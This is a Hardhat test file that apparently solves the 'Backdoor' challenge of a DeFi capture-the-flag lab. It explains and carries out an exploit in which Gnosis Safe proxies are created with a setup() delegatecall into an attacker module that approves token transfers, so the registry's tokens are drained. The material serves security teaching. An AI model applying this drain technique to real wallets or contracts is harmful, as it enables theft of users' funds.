const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
      /** 
       * @dev
       * Gnosis provides a ProxyFactory contract which is used to easily deploy Proxy contracts in front of the GnosisSafe. This is an example of the use of upgradeable contracts using transparent proxies.
       * The deployment goes as follow:
       * -Deployer calls createProxy() in ProxyFactory
       * -The factory deploys a new Proxy contract, which delegates all its logic to the singleton contract (Gnosis Safe)
       * -the caller is expected to call setup() in GnosisSafe to set several parameters, including the owner of the proxy created.
       * 
       * The setup() parameters we are interested in are 'to'(address) and 'data'(bytes).
        -> They allow us to execute a delegatecall to whatever address is passed.

       * The idea is to allow deployers to execute actions on behalf of the proxy before the initial configuration is over, including attaching custom modules extensions 
      
       *SECURITY FLAW: this is what can be exploited:
       *-Any attached module can execute transactions from the proxy without any confirmation from its owner. (through delegate calls passed as calldata in the GnosisSafe setup() function)
       *-the WalletRegistry's proxyCreated() function does not perform any check on the wallet owner before transferring the tokens to the new wallet - the proxy.
       * 
       * 
       * HACK:
       * -We setup a malicious contract that will act as the module, with a setUpManager() function that approves DVT token transfer to our malicious contract. We generate its ABI
       * -We create an attack() function that will loop through the users array and deploy a proxy from the factory, passing one of the users as an owner each time. We pass the wallet registry as the callback address: this will call the WalletRegistry proxyCreated() function.
       * -We call attack(): this in turn calls the proxy factory createProxyWithCallback() function. We pass the setUpManager ABI as the 'data' argument of the setup() encoded call, which constitutes the "initializer" argument of createProxyWithCallback(). 
       * -The setup() function is called in the new proxy. This is where our attack is performed: it in turns delegates a call to our malicious contract (the 'to' parameter of setup()) function setUpManager(), which will cause the proxy contract to approve 10 ETH to be spent by our malicious contract.
       * -proxyCreated() is called on the wallet registry: it transfers 10 DVT to the proxy contract.
       * -we can now call the ERC20 method transferFrom() to transfer the 10 DVT from the proxy to our malicious contract.
       * The attack() loops this process 4 times (once for each user). At the end, we end up with all the funds from the registry.
      */

      const logWalletUser = async (user, name) => {
        const _balance = await this.token.balanceOf(user);
        console.log(
          `\u001b[1;33m${name} has ${ethers.utils.formatEther(_balance)} DVT`
        );
      };
      await logWalletUser(attacker.address, 'The attacker');

      this.moduleManager = await (
        await ethers.getContractFactory('ModuleManager', deployer)
      ).deploy();
      this.walletAttacker = await (
        await ethers.getContractFactory('BackdoorAttackerModule', attacker)
      ).deploy(
        this.walletFactory.address,
        this.masterCopy.address,
        this.walletRegistry.address,
        this.token.address
      );

      //encoding the data we pass to the setup() function of the GnosisSafe to perform a delegatecall on our Attacking module.
      const interfaceManager = new ethers.utils.Interface([
        'function setupManager(address _token, address payable _addressattacker)',
      ]);
      const setupManagerData = interfaceManager.encodeFunctionData(
        'setupManager',
        [this.token.address, this.walletAttacker.address]
      );

      console.log('\u001b[1;35mStarting the attack');
      console.log('');
      await this.walletAttacker
        .connect(attacker)
        .attack(users, this.token.address, attacker.address, setupManagerData);

      await logWalletUser(attacker.address, 'The attacker');

      /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
